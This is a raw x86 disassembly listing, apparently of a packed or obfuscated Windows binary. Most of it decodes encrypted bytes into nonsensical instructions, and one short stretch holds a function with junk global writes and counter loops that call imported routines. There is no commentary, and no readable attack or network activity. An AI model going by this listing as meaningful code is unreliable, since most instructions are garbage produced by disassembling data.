  40d2a7:	add    DWORD PTR [edx],ebx
  40d2a9:	enter  0x2b02,0x4a
  40d2ad:	push   edx
  40d2ae:	dec    esp
  40d2af:	mov    DWORD PTR ds:0xdda22053,esp
  40d2b5:	inc    esi
  40d2b6:	push   0x6e
  40d2b8:	inc    ebx
  40d2b9:	rep ss ins BYTE PTR es:[edi],dx
  40d2bc:	add    ah,BYTE PTR [esi+0x6c]
  40d2bf:	dec    edx
  40d2c0:	and    eax,0x7b4bff37
  40d2c5:	dec    edx
  40d2c6:	pushf  
  40d2c7:	lahf   
  40d2c8:	arpl   WORD PTR [edi],cx
  40d2ca:	fwait
  40d2cb:	xor    esp,DWORD PTR [ebp+0x40]
  40d2ce:	mov    ds:0x2e3242af,al
  40d2d3:	jmp    0x40d2e5
  40d2d5:	sub    bl,0xc9
  40d2d8:	or     eax,0xb1100bc8
  40d2dd:	in     al,dx
  40d2de:	jle    0x40d356
  40d2e0:	aaa    
  40d2e1:	mov    WORD PTR fs:[edi+ebp*1+0x2d90947f],gs
  40d2e9:	test   DWORD PTR [edx+0x2e],0x8426da06
  40d2f0:	mov    esp,fs
  40d2f2:	dec    ebp
  40d2f3:	mov    al,cl
  40d2f5:	sub    esp,ecx
  40d2f7:	std    
  40d2f8:	mov    eax,0xe1cdce9a
  40d2fd:	mov    al,0x35
  40d2ff:	cmp    dl,dl
  40d301:	cld    
  40d302:	bound  edx,QWORD PTR [ecx]
  40d304:	pop    ebp
  40d305:	lahf   
  40d306:	jo     0x40d382
  40d308:	push   es
  40d309:	dec    eax
  40d30a:	sbb    ebp,DWORD PTR [edx+eiz*8+0x19b972f5]
  40d311:	sub    cl,BYTE PTR [ecx+edx*8+0x10]
  40d315:	mov    edx,0xa44092dc
  40d31a:	rcr    DWORD PTR cs:[edx],1
  40d31d:	mov    BYTE PTR [ebx],cl
  40d31f:	xchg   BYTE PTR [esi],cl
  40d321:	push   eax
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	loop   0x40d378
  40d33a:	sbb    eax,0x7e97b017
  40d33f:	jle    0x40d379
  40d341:	jl     0x40d3c1
  40d343:	jle    0x40d393
  40d345:	dec    esi
  40d346:	lahf   
  40d347:	and    BYTE PTR ds:0x7a776cc,dh
  40d34d:	adc    al,BYTE PTR [ebx+0x52]
  40d350:	rcr    BYTE PTR [ebx+0x54],0xa6
  40d354:	xor    eax,0xfb483383
  40d359:	cli    
  40d35a:	retf   
  40d35b:	or     dh,BYTE PTR [edi]
  40d35d:	idiv   DWORD PTR [ecx-0x1c]
  40d360:	test   eax,0xf9562205
  40d365:	imul   ebp,DWORD PTR [edi+0x5d],0x43058a57
  40d36c:	sub    DWORD PTR [esi-0x19],edi
  40d36f:	aam    0xd1
  40d371:	sub    ah,al
  40d373:	sahf   
  40d374:	inc    esp
  40d375:	aaa    
  40d376:	cmp    DWORD PTR [ecx],edx
  40d378:	movd   mm6,DWORD PTR [ebx]
  40d37b:	mov    BYTE PTR [esi],ch
  40d37d:	shl    DWORD PTR [ebx],1
  40d37f:	inc    ebp
  40d380:	test   BYTE PTR ds:[eax+ebp*2-0x18574e29],dl
  40d388:	and    al,0x55
  40d38a:	mov    esp,0xb8768553
  40d38f:	imul   eax,DWORD PTR es:[ebx+0x43],0xffffffad
  40d394:	push   es
  40d395:	hlt    
  40d396:	add    DWORD PTR [eax-0x2835b6e6],edi
  40d39c:	ret    
  40d39d:	jg     0x40d3a3
  40d39f:	mov    bl,0x15
  40d3a1:	out    0x16,al
  40d3a3:	mov    BYTE PTR [ebx+0x2a],0x24
  40d3a7:	imul   esi,DWORD PTR [edi],0xcb6b2ec6
  40d3ad:	fcom   st(6)
  40d3af:	in     al,0x3
  40d3b1:	clc    
  40d3b2:	push   esp
  40d3b3:	ss jne 0x40d3fb
  40d3b6:	push   cs
  40d3b7:	sti    
  40d3b8:	std    
  40d3b9:	(bad)  
  40d3ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3bb:	fbstp  TBYTE PTR [edx-0x1e]
  40d3be:	stos   BYTE PTR es:[edi],al
  40d3bf:	inc    edx
  40d3c0:	in     al,0xc9
  40d3c2:	lods   al,BYTE PTR ds:[esi]
  40d3c3:	js     0x40d371
  40d3c5:	popf   
  40d3c6:	sbb    eax,0xdcd821bb
  40d3cb:	adc    bh,ah
  40d3cd:	and    BYTE PTR [esi-0x61],cl
  40d3d0:	xchg   ecx,eax
  40d3d1:	stc    
  40d3d2:	inc    esi
  40d3d3:	sbb    al,0x6e
  40d3d6:	xor    BYTE PTR [esi-0x36c83c12],0x1e
  40d3dd:	dec    eax
  40d3de:	sub    eax,0x12b940c5
  40d3e3:	mov    ebx,0x3d20397e
  40d3e8:	cmp    dl,BYTE PTR [eax+ebx*4]
  40d3eb:	out    dx,eax
  40d3ec:	xchg   DWORD PTR [esi+edi*4-0x64],ebx
  40d3f0:	mov    eax,0xc546fad6
  40d3f5:	mov    WORD PTR [ebx-0x1a],?
  40d3f8:	push   ds
  40d3f9:	inc    ecx
  40d3fa:	pop    edi
  40d3fb:	lods   eax,DWORD PTR ds:[esi]
  40d3fc:	nop
  40d3fd:	mov    dl,0xd5
  40d3ff:	cli    
  40d400:	sbb    DWORD PTR [ecx+0x5d],eax
  40d403:	mov    esp,0xa2409fb4
  40d408:	mov    ebx,0xe36d90c7
  40d40d:	pop    ebp
  40d40e:	retf   
  40d40f:	test   al,0x17
  40d411:	xlat   BYTE PTR ds:[ebx]
  40d412:	mov    ?,WORD PTR [ecx-0x72fef5ff]
  40d418:	mov    eax,0x1d920012
  40d41d:	xlat   BYTE PTR ds:[ebx]
  40d41e:	shr    ah,0x60
  40d421:	cmp    dh,bh
  40d423:	ret    0xfa83
  40d426:	(bad)  
  40d427:	aas    
  40d428:	or     eax,0x485465dc
  40d42d:	hlt    
  40d42e:	ins    DWORD PTR es:[edi],dx
  40d42f:	or     ebp,eax
  40d431:	mov    ebp,gs
  40d433:	xchg   edx,ebx
  40d435:	mov    ecx,0x7cabd892
  40d43a:	xchg   al,bh
  40d43c:	in     al,dx
  40d43d:	or     eax,0xb2928bc2
  40d442:	scas   eax,DWORD PTR es:[edi]
  40d443:	mov    ds,WORD PTR [ecx]
  40d445:	scas   al,BYTE PTR es:[edi]
  40d446:	or     DWORD PTR [ebx+0x3b37f8a7],eax
  40d44c:	and    BYTE PTR [ecx],ch
  40d44e:	dec    edx
  40d44f:	sbb    al,0x97
  40d451:	lods   al,BYTE PTR ds:[esi]
  40d452:	inc    ebp
  40d453:	and    BYTE PTR [ebx+0x0],0x98
  40d457:	sub    al,0x95
  40d459:	(bad)  
  40d45a:	xchg   esp,eax
  40d45b:	retf   0xf2f3
  40d45e:	cld    
  40d45f:	sub    edi,DWORD PTR [ebp-0x2b]
  40d462:	and    bl,BYTE PTR [ebx-0x243e856f]
  40d468:	adc    BYTE PTR [edi-0x4c],bh
  40d46b:	lsl    ebx,WORD PTR [esi]
  40d46e:	and    eax,0x62812a7c
  40d473:	shr    edx,1
  40d475:	mov    bh,0x3f
  40d477:	lds    edx,FWORD PTR [esi]
  40d479:	in     al,dx
  40d47a:	pop    ebp
  40d47b:	inc    edx
  40d47c:	push   ebx
  40d47d:	xor    al,0x15
  40d47f:	adc    BYTE PTR [ecx],dl
  40d481:	scas   al,BYTE PTR es:[edi]
  40d482:	ja     0x40d438
  40d484:	dec    eax
  40d485:	inc    ebp
  40d486:	inc    edx
  40d487:	inc    ecx
  40d488:	inc    esp
  40d489:	pop    esi
  40d48a:	mov    ebx,0xdae6c52d
  40d48f:	inc    edx
  40d490:	xchg   esi,eax
  40d491:	adc    BYTE PTR [ebp+0x16],dl
  40d494:	enter  0x7d0f,0x9b
  40d498:	and    esi,0xffffffc9
  40d49b:	or     edx,DWORD PTR [ebp+esi*4+0x3b7b9af4]
  40d4a2:	pop    ecx
  40d4a3:	mov    edi,DWORD PTR fs:[ebx]
  40d4a6:	(bad)  
  40d4a7:	fcom   QWORD PTR [esi]
  40d4a9:	repz mov gs,WORD PTR [eax-0x24]
  40d4ad:	adc    BYTE PTR [ecx+0x4e],dl
  40d4b0:	or     DWORD PTR [ecx+0x52],0x2982aa7c
  40d4b7:	rcl    BYTE PTR [ebx+ebp*8-0xff344c2],0xfa
  40d4bf:	les    eax,FWORD PTR [ebx+0x2c92f52a]
  40d4c5:	shr    BYTE PTR [edx+0x7b],1
  40d4c8:	mov    eax,DWORD PTR [ecx]
  40d4ca:	add    DWORD PTR [ebp+0x7e],eax
  40d4cd:	dec    edi
  40d4ce:	lds    esp,FWORD PTR [ebp+0x501e9312]
  40d4d4:	shr    DWORD PTR [eax+0x76],1
  40d4d7:	mov    ds:0x48b2b0e4,eax
  40d4dc:	jge    0x40d55a
  40d4de:	ds push eax
  40d4e0:	stos   DWORD PTR es:[edi],eax
  40d4e1:	ret    0x9066
  40d4e4:	retf   
  40d4e5:	shl    DWORD PTR [edx-0x59464ddd],1
  40d4eb:	ins    BYTE PTR es:[edi],dx
  40d4ec:	mul    ch
  40d4ee:	adc    ch,bl
  40d4f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4f1:	add    eax,0xdcfb29ee
  40d4f6:	adc    eax,0xc7dd12b7
  40d4fb:	jl     0x40d495
  40d4fd:	bswap  ebp
  40d4ff:	xlat   BYTE PTR ds:[ebx]
  40d500:	sub    al,0x7e
  40d502:	iret   
  40d503:	ja     0x40d4aa
  40d505:	loop   0x40d4ec
  40d507:	adc    eax,0x13e8ec03
  40d50c:	sbb    BYTE PTR [edx],cl
  40d50e:	inc    ebp
  40d50f:	popa   
  40d510:	pusha  
  40d511:	xlat   BYTE PTR ds:[ebx]
  40d512:	xchg   DWORD PTR es:[ebx+0x218dd175],eax
  40d519:	jne    0x40d4f4
  40d51b:	sbb    DWORD PTR [edx-0x7],ebp
  40d51e:	daa    
  40d51f:	jmp    0xc20b:0x8ce5f7bd
  40d526:	sub    eax,0x987445e
  40d52b:	fwait
  40d52c:	xchg   ebx,eax
  40d52d:	iret   
  40d52e:	adc    dh,0xa8
  40d531:	sbb    al,0x1e
  40d533:	inc    edx
  40d534:	or     esp,eax
  40d536:	push   edx
  40d537:	ss inc esp
  40d539:	pop    esp
  40d53a:	lods   eax,DWORD PTR ds:[esi]
  40d53b:	imul   ebp,DWORD PTR [edx],0xffffffec
  40d53e:	pop    ss
  40d53f:	scas   al,BYTE PTR es:[edi]
  40d540:	addr16 aaa 
  40d542:	inc    ecx
  40d543:	pop    edx
  40d544:	or     cl,BYTE PTR [edx]
  40d546:	or     al,0x89
  40d548:	loopne 0x40d4d9
  40d54a:	mov    edi,0xa5b50495
  40d54f:	popf   
  40d550:	les    eax,FWORD PTR [edx-0x80]
  40d553:	scas   eax,DWORD PTR es:[edi]
  40d554:	xor    esi,ebp
  40d556:	xchg   esp,ebx
  40d558:	movzx  edx,ah
  40d55b:	sub    BYTE PTR [edx-0x6a29948c],ch
  40d561:	les    ebp,FWORD PTR [ecx+esi*8]
  40d564:	sar    DWORD PTR [ecx-0x69f9078],0xb3
  40d56b:	rol    BYTE PTR [edi+edi*1+0x51],0x3c
  40d570:	scas   eax,DWORD PTR es:[edi]
  40d571:	leave  
  40d572:	or     bl,bl
  40d574:	cmovno esp,DWORD PTR [ecx-0x2d]
  40d578:	add    al,0x7e
  40d57a:	(bad)  
  40d57b:	in     eax,0xdc
  40d57d:	rcl    BYTE PTR [ebp+0x3],1
  40d580:	mov    esi,0xaf8c3e89
  40d585:	push   edi
  40d586:	inc    edx
  40d587:	mov    al,ds:0x343c739
  40d58c:	sbb    al,0x1a
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4337a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433797,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43379b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4337a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4337e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43379b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433827,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43382f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43375b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4337db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433817,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433817
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433817,edx
  40d64f:	cmp    DWORD PTR ds:0x433817,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433817,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433763,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433763
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433763,edx
  40d68b:	cmp    DWORD PTR ds:0x433763,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433853
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433763,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433767
  40d6b7:	add    eax,DWORD PTR ds:0x43379b
  40d6bd:	mov    ds:0x433767,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x6a0482a
  40d6f9:	call   edi
  40d6fb:	sub    edi,DWORD PTR [edx-0x6e]
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d781
  40d705:	loop   0x40d702
  40d707:	adc    eax,0xb48a8ad1
  40d70c:	add    DWORD PTR [ebx],ebx
  40d70e:	push   edi
  40d70f:	jbe    0x40d6da
  40d711:	call   0xca77598c
  40d716:	retf   
  40d717:	bound  ecx,QWORD PTR [ecx]
  40d719:	inc    ebx
  40d71a:	dec    ebx
  40d71b:	mov    ds:0x858f5329,eax
  40d720:	imul   esi,DWORD PTR [edi],0x4e01f066
  40d726:	test   DWORD PTR [eax+esi*2+0x72],0x792f754a
  40d72e:	sub    eax,0xc3c4eeaa
  40d733:	pop    ss
  40d734:	aaa    
  40d735:	and    DWORD PTR [edx+0x132e35e5],ebp
  40d73b:	mov    ds:0x7b625633,eax
  40d740:	dec    ebp
  40d741:	popf   
  40d742:	cmp    eax,0xd6a84d67
  40d747:	fdivr  st,st(2)
  40d749:	xchg   esi,eax
  40d74a:	test   BYTE PTR [ecx+eiz*4],0xc2
  40d74e:	pavgb  mm6,mm7
  40d751:	pop    ss
  40d752:	pop    edx
  40d753:	fcom   QWORD PTR [ecx+0x4e]
  40d756:	(bad)  
  40d757:	cmp    BYTE PTR [ecx-0x19],al
  40d75a:	dec    ebx
  40d75b:	xlat   BYTE PTR ds:[ebx]
  40d75c:	shr    DWORD PTR ds:0x4a230ad,cl
  40d762:	mov    ds:0xfa4045ad,al
  40d767:	sub    eax,0x13aa396f
  40d76c:	dec    esp
  40d76d:	out    dx,al
  40d76e:	loope  0x40d711
  40d770:	arpl   WORD PTR [ebx-0x35],bx
  40d773:	jg     0x40d7bd
  40d775:	sti    
  40d776:	imul   esp,DWORD PTR [edx-0x15],0xd
  40d77a:	mov    DWORD PTR [ebx+0x2c7ece48],edi
  40d780:	repnz in eax,0x41
  40d783:	ror    DWORD PTR [esi+ecx*4-0x7f52d628],cl
  40d78a:	std    
  40d78b:	lea    esp,[ebx+ebp*2]
  40d78e:	xor    eax,0xeb2e551c
  40d793:	cmp    al,0xdc
  40d795:	fistp  QWORD PTR [esi-0x53698d69]
  40d79b:	ficom  WORD PTR [esi]
  40d79d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d79e:	inc    esi
  40d79f:	sub    eax,0x79b67ba9
  40d7a4:	(bad)  
  40d7a5:	pop    ss
  40d7a6:	jne    0x40d72c
  40d7a8:	sub    BYTE PTR [eax+0xc588ab0],dh
  40d7ae:	outs   dx,BYTE PTR ds:[esi]
  40d7af:	sti    
  40d7b0:	leave  
  40d7b1:	or     dh,BYTE PTR es:[eax+eax*8]
  40d7b5:	in     al,0xc2
  40d7b7:	(bad)  
  40d7b8:	loop   0x40d752
  40d7ba:	cli    
  40d7bb:	pop    ss
  40d7bc:	stos   BYTE PTR es:[edi],al
  40d7bd:	xor    al,BYTE PTR [edi-0x29]
  40d7c0:	inc    ebx
  40d7c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7c2:	push   es
  40d7c3:	sbb    cl,BYTE PTR [edi+0x4743a24c]
  40d7c9:	sub    BYTE PTR [ebp+0x5b4208ec],ch
  40d7cf:	add    al,0x96
  40d7d1:	mov    DWORD PTR ds:0x91a17a9f,ecx
  40d7d7:	cs xchg esp,eax
  40d7d9:	cli    
  40d7da:	dec    eax
  40d7db:	mov    esi,0x86d70f39
  40d7e0:	jl     0x40d787
  40d7e2:	pop    ss
  40d7e3:	mov    ebx,0x64e78b42
  40d7e8:	jo     0x40d851
  40d7ea:	mov    eax,ds:0x53dc35fc
  40d7ef:	cmp    DWORD PTR [ebp-0x6d17dbfa],0xe72abe68
  40d7f9:	in     al,0x1c
  40d7fb:	scas   al,BYTE PTR es:[edi]
  40d7fc:	lods   eax,DWORD PTR ds:[esi]
  40d7fd:	xor    eax,0xe0881c71
  40d802:	cld    
  40d803:	mov    esp,0x158a28bd
  40d808:	cwde   
  40d809:	enter  0xe770,0x62
  40d80d:	in     eax,dx
  40d80e:	fxch   st(1)
  40d810:	daa    
  40d811:	dec    ebp
  40d812:	icebp  
  40d813:	lods   al,BYTE PTR ds:[esi]
  40d814:	pop    ds
  40d815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d816:	test   eax,0x79c76673
  40d81b:	mov    al,ds:0x54422132
  40d820:	loope  0x40d7e4
  40d822:	std    
  40d823:	addr16 mov dl,0x74
  40d826:	out    0xd8,al
  40d828:	jp     0x40d7e1
  40d82a:	retf   
  40d82b:	addr16 sti 
  40d82d:	ins    BYTE PTR es:[edi],dx
  40d82e:	rcl    BYTE PTR [eax],1
  40d830:	mov    ebx,0x30de2584
  40d835:	lea    edx,[ebx-0x25284222]
  40d83b:	adc    eax,0x2eee4859
  40d840:	sbb    dl,ah
  40d842:	retf   0x6ece
  40d845:	mul    ebx
  40d847:	addr16 pop ecx
  40d849:	and    ebp,esi
  40d84b:	jmp    0x4c6bc0a1
  40d850:	mov    ?,WORD PTR [esi+eiz*1]
  40d853:	(bad)  
  40d855:	adc    dh,BYTE PTR [ecx-0x13]
  40d858:	aaa    
  40d859:	les    edi,FWORD PTR [ebx-0x51]
  40d85c:	lods   eax,DWORD PTR ds:[esi]
  40d85d:	mul    DWORD PTR [ebx+0x6f]
  40d860:	sahf   
  40d861:	jp     0x40d828
  40d863:	call   0xf643:0xdb2de3cb
  40d86a:	test   eax,0x2bff96d0
  40d86f:	loopne 0x40d878
  40d871:	(bad)  
  40d873:	inc    edx
  40d874:	xor    ebp,DWORD PTR cs:[esi+0x47]
  40d878:	sub    BYTE PTR [edi+0x14],cl
  40d87b:	dec    edx
  40d87c:	scas   eax,DWORD PTR es:[edi]
  40d87d:	pop    esp
  40d87e:	jns    0x40d879
  40d880:	test   eax,0x8465bac8
  40d885:	cdq    
  40d886:	and    esp,DWORD PTR [ebx-0x77]
  40d889:	mov    al,ds:0x74fb53d2
  40d88e:	dec    edi
  40d88f:	mov    ah,0x6b
  40d891:	mov    esp,0x1b5fda3e
  40d896:	ins    DWORD PTR es:[edi],dx
  40d897:	outs   dx,BYTE PTR ds:[esi]
  40d898:	lea    ebp,[eax+0x52]
  40d89b:	in     al,dx
  40d89c:	test   al,0xbd
  40d89e:	jmp    0xbf1d:0xdc07650f
  40d8a5:	scas   al,BYTE PTR es:[edi]
  40d8a6:	dec    esi
  40d8a7:	and    BYTE PTR [ecx],ah
  40d8a9:	in     al,dx
  40d8aa:	jae    0x40d82d
  40d8ac:	call   0xe573:0x2a3243cf
  40d8b3:	pop    ebp
  40d8b4:	iret   
  40d8b5:	xchg   ebp,eax
  40d8b6:	sar    BYTE PTR ds:0x29fad3e0,1
  40d8bc:	inc    esi
  40d8bd:	fwait
  40d8be:	push   0x8ca37a3c
  40d8c3:	jp     0x40d8d2
  40d8c5:	pop    ss
  40d8c6:	lahf   
  40d8c7:	out    0x21,eax
  40d8c9:	repnz and al,0x12
  40d8cc:	les    edx,FWORD PTR [edi+ebx*2+0x2e]
  40d8d0:	fisubr WORD PTR [esi-0x44df7f4b]
  40d8d6:	sub    al,0xab
  40d8d8:	dec    edx
  40d8d9:	push   0xebb501dd
  40d8de:	xor    eax,0x91f38ca9
  40d8e3:	jae    0x40d8fd
  40d8e5:	data16 cs cli 
  40d8e8:	add    edi,esp
  40d8ea:	fs fnclex 
  40d8ed:	cld    
  40d8ee:	jae    0x40d96a
  40d8f0:	test   bl,dl
  40d8f2:	inc    eax
  40d8f3:	lock pop ebp
  40d8f5:	dec    eax
  40d8f6:	jns    0x40d960
  40d8f8:	dec    bp
  40d8fa:	cmp    BYTE PTR [ebx-0x6b8ee353],dh
  40d900:	call   0x5308:0x6dcfddd
  40d907:	sub    eax,0xd9814dbe
  40d90c:	or     al,0x24
  40d90e:	psrlq  mm5,QWORD PTR [ecx+ebx*1]
  40d912:	jno    0x40d8e7
  40d914:	xor    eax,0xe4d178d2
  40d919:	or     al,0xbc
  40d91b:	sbb    eax,0xc9625a8c
  40d920:	iret   
  40d921:	jb     0x40d93c
  40d923:	mul    DWORD PTR [ebp-0x7eda856d]
  40d929:	cli    
  40d92a:	out    dx,eax
  40d92b:	loop   0x40d91e
  40d92d:	lock or BYTE PTR ds:0x9d0a422f,0x59
  40d935:	arpl   WORD PTR [ecx+0x41d53477],ax
  40d93b:	xor    eax,ecx
  40d93d:	aas    
  40d93e:	mov    dh,0xa6
  40d940:	shl    DWORD PTR ds:0x1895dc7,1
  40d946:	mov    eax,DWORD PTR [ebp-0x8]
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0x382b51ed
  40d96a:	cmp    BYTE PTR [edi+0x7e903a1b],ah
  40d970:	jle    0x40d9b0
  40d972:	jl     0x40d9f2
  40d974:	jle    0x40d91c
  40d976:	outs   dx,BYTE PTR ds:[esi]
  40d977:	int3   
  40d978:	cmp    DWORD PTR [edx-0x77e871c8],0x15
  40d97f:	push   esp
  40d980:	jbe    0x40d9a6
  40d982:	imul   esp,DWORD PTR ds:[ebx+0x57],0xffffffae
  40d987:	and    esi,ebp
  40d989:	and    dh,BYTE PTR [eax]
  40d98b:	push   ss
  40d98c:	add    esi,ebp
  40d98e:	dec    esi
  40d98f:	popa   
  40d990:	add    al,0xe5
  40d992:	popa   
  40d993:	scas   eax,DWORD PTR es:[edi]
  40d994:	js     0x40d963
  40d996:	pop    edi
  40d997:	jb     0x40d9a4
  40d999:	dec    ebp
  40d99a:	jle    0x40da15
  40d99c:	mov    eax,0xb420a7c8
  40d9a1:	scas   al,BYTE PTR es:[edi]
  40d9a2:	sbb    al,0xd8
  40d9a4:	stc    
  40d9a5:	and    eax,0x5568a61b
  40d9aa:	and    al,0xbe
  40d9ac:	cli    
  40d9ad:	sub    ch,0x3
  40d9b0:	addr16 inc esp
  40d9b2:	add    edi,DWORD PTR [eax]
  40d9b4:	or     eax,ecx
  40d9b6:	inc    ecx
  40d9b7:	push   ebp
  40d9b8:	or     eax,0x3d55a3e7
  40d9bd:	mov    edx,0x499e534c
  40d9c2:	psadbw mm1,QWORD PTR [esi+0x1c]
  40d9c6:	js     0x40d983
  40d9c8:	sbb    BYTE PTR [ebx],al
  40d9ca:	mov    al,0xec
  40d9cc:	aaa    
  40d9cd:	jmp    0x1cc5:0x21879c0f
  40d9d4:	push   0xffffffb5
  40d9d6:	dec    eax
  40d9d7:	sub    eax,0xa8a99261
  40d9dc:	xchg   ecx,eax
  40d9dd:	pop    es
  40d9de:	out    0xe3,eax
  40d9e0:	cdq    
  40d9e1:	xchg   DWORD PTR [ebp-0x65],ebp
  40d9e4:	loopne 0x40da1a
  40d9e6:	cmp    al,0x4a
  40d9e8:	jno    0x40da1f
  40d9ea:	mov    BYTE PTR [esi+0x477850bf],0xc7
  40d9f1:	sub    edx,DWORD PTR [edi-0xa]
  40d9f4:	sub    edi,0x10c91739
  40d9fa:	mov    esp,0x767dbc89
  40d9ff:	and    bh,BYTE PTR [ebp+0x38ee5522]
  40da05:	lea    eax,[esi+0x6c02b815]
  40da0b:	mov    cs,WORD PTR [ecx-0x20]
  40da0e:	sbb    bh,BYTE PTR [ecx+0x7bd1f071]
  40da14:	test   BYTE PTR [esi-0x20],0x50
  40da18:	bound  ecx,QWORD PTR [eax-0x370ac946]
  40da1e:	dec    ebx
  40da1f:	pop    ds
  40da20:	add    DWORD PTR [edi-0x60],ebp
  40da23:	pop    ebx
  40da24:	popa   
  40da25:	aaa    
  40da26:	xchg   ebx,eax
  40da27:	in     eax,0x97
  40da29:	fs inc edi
  40da2b:	outs   dx,DWORD PTR ds:[esi]
  40da2c:	push   ds
  40da2d:	les    edi,FWORD PTR [ebx-0x68]
  40da30:	xor    eax,0x903c16b9
  40da35:	test   DWORD PTR [eax+0xb2099a5],0x756462a2
  40da3f:	sbb    DWORD PTR [ecx],edi
  40da41:	sub    al,0x82
  40da43:	pop    eax
  40da44:	cld    
  40da45:	scas   al,BYTE PTR es:[edi]
  40da46:	mov    WORD PTR [esi],ds
  40da48:	jnp    0x40daa7
  40da4a:	pop    es
  40da4b:	cmp    BYTE PTR [ebx-0x24cb719d],0xd9
  40da52:	or     DWORD PTR [ebx+eiz*1-0x48],ebx
  40da56:	mov    WORD PTR [ebx-0x779815ef],cs
  40da5c:	lea    ebx,[ecx-0xef5e628]
  40da62:	mov    eax,ds:0xdfcb6778
  40da67:	outs   dx,DWORD PTR ds:[esi]
  40da68:	in     al,0x8
  40da6a:	sub    eax,DWORD PTR [esi]
  40da6c:	add    esi,DWORD PTR [eax+ecx*2-0x4c4c3219]
  40da73:	jno    0x40da71
  40da75:	bound  ebp,QWORD PTR [eax]
  40da77:	mov    bl,0x14
  40da79:	in     eax,dx
  40da7a:	cli    
  40da7b:	je     0x40dab1
  40da7d:	add    eax,0xa28d1c9
  40da82:	sbb    eax,0xaa32818d
  40da87:	add    al,0xff
  40da89:	xor    DWORD PTR [ebx],ebp
  40da8b:	mov    eax,0xf92376a6
  40da90:	jns    0x40da53
  40da92:	xor    ecx,ecx
  40da94:	mov    al,0xaa
  40da96:	pop    esp
  40da97:	pop    edi
  40da98:	dec    edx
  40da99:	into   
  40da9a:	mov    esi,0x5f3a5f78
  40da9f:	out    0x51,eax
  40daa1:	scas   al,BYTE PTR es:[edi]
  40daa2:	test   DWORD PTR [edi-0x2],0x27aa1fe4
  40daa9:	mov    DWORD PTR [eax+ebx*4-0x19454ac1],ebp
  40dab0:	xchg   bl,ch
  40dab2:	pop    esi
  40dab3:	push   ecx
  40dab4:	xchg   edx,eax
  40dab5:	xchg   ecx,eax
  40dab6:	cmp    edx,DWORD PTR [ecx-0x6f]
  40dab9:	mov    bl,0x6c
  40dabb:	cmp    DWORD PTR [ebp-0x35],esi
  40dabe:	ss loop 0x40dab4
  40dac1:	mov    esi,DWORD PTR [eax-0x41]
  40dac4:	sbb    eax,0x68c5ecf3
  40dac9:	mov    db5,edx
  40dacc:	retf   
  40dacd:	aad    0x4c
